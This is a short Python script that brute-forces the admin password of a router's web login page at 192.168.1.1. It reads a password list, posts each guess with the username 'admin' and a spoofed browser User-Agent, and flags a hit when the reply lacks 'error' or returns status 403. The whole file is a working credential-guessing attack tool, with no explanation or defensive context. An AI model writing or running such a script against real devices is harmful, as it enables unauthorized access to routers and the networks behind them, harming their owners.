import requests

def exec(passlist):
    url = "http://192.168.1.1:80/login/login-page.cgi"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
    for line in passlist:
        pass_ = line.strip("\n")
        data = {"AuthName": "admin", "AuthPassword": pass_}
        req = requests.post(url,headers=headers,data=data)
        print("[*] Trying",pass_, req.status_code)
        if not 'error' in req.text:
            print("\n[+] Found ->",pass_)
            break
        if not "error" in str(req.content):
            print("\n[+] Found ->",pass_)
            break
        if req.status_code == 403:
            print("\n[?] Possibly" , pass_)
            break
